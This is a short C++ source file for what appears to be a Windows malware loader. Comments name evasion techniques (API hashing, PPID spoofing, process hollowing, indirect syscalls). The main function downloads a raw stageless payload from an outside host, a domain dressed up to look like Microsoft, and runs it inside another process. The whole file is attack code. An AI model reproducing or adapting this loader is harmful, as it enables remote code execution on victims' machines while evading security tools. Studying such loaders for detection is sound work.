#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include "Ven.h"



int main()
{
    // Compile Time API Hashing
    // Run-Time Dynamic Linking 
    // PPID spoofing
    // Process hollowing
    // Indirect syscalls execution
    
    DWORD pid = GetPID();
    
    // Raw stageless payload targetting microsoft.lestutosdeprocessus.fr
    std::vector<BYTE> sh = Download(L"microsoft.lestutosdeprocessus.fr\0", L"/payload.bin\0");

    execution(sh, pid);
}